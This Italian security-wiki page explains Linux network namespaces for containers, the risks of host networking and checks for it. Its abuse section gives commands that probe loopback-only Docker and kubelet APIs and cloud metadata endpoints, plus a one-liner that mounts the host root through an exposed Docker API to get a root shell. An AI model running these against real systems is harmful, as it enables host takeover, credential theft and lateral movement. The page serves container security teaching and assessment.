# Namespace di rete

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace di rete isola le risorse correlate alla rete come interfacce, indirizzi IP, tabelle di routing, stato ARP/neighbor, regole del firewall, socket e il contenuto di file come `/proc/net`. Per questo un container può avere quello che sembra il suo `eth0`, le sue rotte locali e il proprio dispositivo loopback senza possedere lo stack di rete reale dell'host.

Dal punto di vista della sicurezza, questo è importante perché l'isolamento di rete riguarda molto più del semplice port binding. Un namespace di rete privato limita ciò che il workload può osservare o riconfigurare direttamente. Una volta che quel namespace è condiviso con l'host, il container può improvvisamente ottenere visibilità su listener dell'host, servizi locali dell'host e punti di controllo di rete che non erano mai destinati ad essere esposti all'applicazione.

## Funzionamento

Un namespace di rete appena creato inizia con un ambiente di rete vuoto o quasi vuoto fino a quando le interfacce non gli vengono collegate. I runtime dei container poi creano o collegano interfacce virtuali, assegnano indirizzi e configurano rotte in modo che il workload abbia la connettività prevista. Nelle implementazioni basate su bridge, questo di solito significa che il container vede un'interfaccia supportata da veth collegata a un bridge dell'host. In Kubernetes, i plugin CNI gestiscono la configurazione equivalente per il networking dei Pod.

Questa architettura spiega perché `--network=host` o `hostNetwork: true` rappresentano un cambiamento così drastico. Invece di ricevere uno stack di rete privato preconfigurato, il workload si unisce allo stack reale dell'host.

## Laboratorio

Puoi vedere un namespace di rete quasi vuoto con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E puoi confrontare i container normali e quelli con rete host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Il container con networking host non ha più la propria vista isolata di socket e interfacce. Solo questo cambiamento è già significativo prima ancora di chiedersi quali capacità abbia il processo.

## Utilizzo a runtime

Docker e Podman normalmente creano un namespace di rete privato per ogni container, salvo diversa configurazione. Kubernetes di solito assegna a ciascun Pod il proprio namespace di rete, condiviso tra i container all'interno del Pod ma separato dall'host. I sistemi Incus/LXC offrono anch'essi un'ampia isolazione basata sui namespace di rete, spesso con una maggiore varietà di configurazioni di networking virtuale.

Il principio comune è che il networking privato è il confine di isolamento predefinito, mentre il networking host è un'esclusione esplicita da quel confine.

## Errori di configurazione

L'errore di configurazione più importante è semplicemente condividere il namespace di rete dell'host. Questo a volte viene fatto per performance, monitoraggio a basso livello o comodità, ma rimuove uno dei confini più netti disponibili per i container. I listener locali dell'host diventano raggiungibili in modo più diretto, i servizi disponibili solo su localhost possono diventare accessibili, e capability come `CAP_NET_ADMIN` o `CAP_NET_RAW` diventano molto più pericolose perché le operazioni che abilitano vengono ora applicate all'ambiente di rete dell'host.

Un altro problema è l'assegnazione eccessiva di capability legate alla rete anche quando il namespace di rete è privato. Un namespace privato aiuta, ma non rende innocui i raw sockets o il controllo avanzato della rete.

## Abuso

In ambienti debolmente isolati, gli attaccanti possono ispezionare i servizi in ascolto sull'host, raggiungere endpoint di gestione legati solo al loopback, sniff o interferire con il traffico a seconda delle capability e dell'ambiente, oppure riconfigurare routing e stato del firewall se è presente `CAP_NET_ADMIN`. In un cluster, questo può anche facilitare movimenti laterali e ricognizione del control-plane.

Se sospetti l'uso del networking host, inizia confermando che le interfacce e i listener visibili appartengano all'host piuttosto che a una rete di container isolata:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
I servizi loopback-only sono spesso la prima scoperta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se sono presenti capacità di rete, verifica se il workload può ispezionare o alterare lo stack visibile:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Negli ambienti cluster o cloud, il networking dell'host giustifica anche una rapida local recon di metadata e dei servizi adiacenti al control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Esempio completo: Rete dell'host + Runtime locale / Accesso Kubelet

La rete dell'host non garantisce automaticamente il root dell'host, ma spesso espone servizi che sono intenzionalmente raggiungibili solo dal nodo stesso. Se uno di questi servizi è debolmente protetto, la rete dell'host diventa un percorso diretto di privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet su localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- compromissione diretta dell'host se una API del runtime locale è esposta senza adeguata protezione
- ricognizione del cluster o lateral movement se kubelet o agenti locali sono raggiungibili
- manipolazione del traffico o denial of service quando combinato con `CAP_NET_ADMIN`

## Checks

L'obiettivo di questi controlli è capire se il processo dispone di uno stack di rete privato, quali rotte e listener sono visibili e se la vista di rete appare già simile a quella dell'host prima ancora di testare le capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Cosa è interessante qui:

- Se l'identificatore del namespace o l'insieme di interfacce visibili sembra quello dell'host, host networking potrebbe già essere in uso.
- `ss -lntup` è particolarmente utile perché rivela loopback-only listeners e local management endpoints.
- Rotte, nomi delle interfacce e il contesto del firewall diventano molto più importanti se `CAP_NET_ADMIN` o `CAP_NET_RAW` sono presenti.

Quando valuti un container, considera sempre il network namespace insieme al capability set. Host networking unito a forti network capabilities è una postura molto diversa rispetto a bridge networking con un insieme predefinito di capability ristretto.
{{#include ../../../../../banners/hacktricks-training.md}}
